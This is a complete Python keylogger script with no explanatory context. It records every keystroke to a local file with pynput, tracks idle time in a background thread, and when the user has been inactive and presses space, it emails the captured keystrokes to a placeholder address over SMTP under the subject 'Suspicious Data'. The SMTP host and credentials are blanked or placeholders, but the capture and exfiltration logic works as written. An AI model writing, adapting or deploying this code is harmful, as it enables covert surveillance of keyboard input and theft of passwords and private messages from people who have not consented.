import time
import threading
import smtplib
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener

active = True
last_active_time = time.time()

def send_email(email, password, message):
    server = smtplib.SMTP('****', 587)  
    server.starttls()
    server.login(email, password)

    msg = MIMEText(message)
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = 'Suspicious Data'

    server.sendmail(email, email, msg.as_string())
    server.quit()

def check_activity():
    global active
    global last_active_time

    while True:
       
        if time.time() - last_active_time > 300:
            active = False
        else:
            active = True
        time.sleep(60)  

def on_press(key):
    global last_active_time
    global active

    if active:
        last_active_time = time.time()

    with open("keylog.txt", "a") as f:
        f.write(str(key))


    if not active and key == Key.space:
        with open("keylog.txt", "r") as f:
            keystrokes = f.read()
        send_email('your_email@example.com', 'your_password', keystrokes)


activity_thread = threading.Thread(target=check_activity)
activity_thread.daemon = True
activity_thread.start()


with Listener(on_press=on_press) as listener:
    listener.join()
